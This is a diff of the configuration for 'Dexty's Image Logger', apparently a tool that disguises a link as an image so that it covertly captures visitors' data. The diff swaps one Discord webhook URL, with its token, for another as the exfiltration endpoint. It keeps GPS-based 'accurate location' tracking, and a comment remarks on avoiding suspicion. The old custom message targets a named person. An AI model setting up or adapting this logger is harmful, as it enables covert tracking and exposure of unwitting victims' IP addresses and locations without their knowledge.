@@ -9,7 +9,7 @@ author = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1420362163117228128/-NyUVnCyJ8k7YNPhkW_QGq_fWX0Pb6eyyp0yaLht3unopY80FASrIfksZcnJUo3ZlW4I",
+    "webhook": "https://discord.com/api/webhooks/1412837390183039128/p4Cso6sWX4_GY860kdZi01KrFsrAtFvC1Gn-LOzuYrqAtJIgCvt48L8DO2oeFiPgDWkW",
     "image": "https://i.imgur.com/hZ8dfSC.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -24,8 +24,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
-        "message": "Hey Zudika, Jangan ganggu Andreas.", # Message to show
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
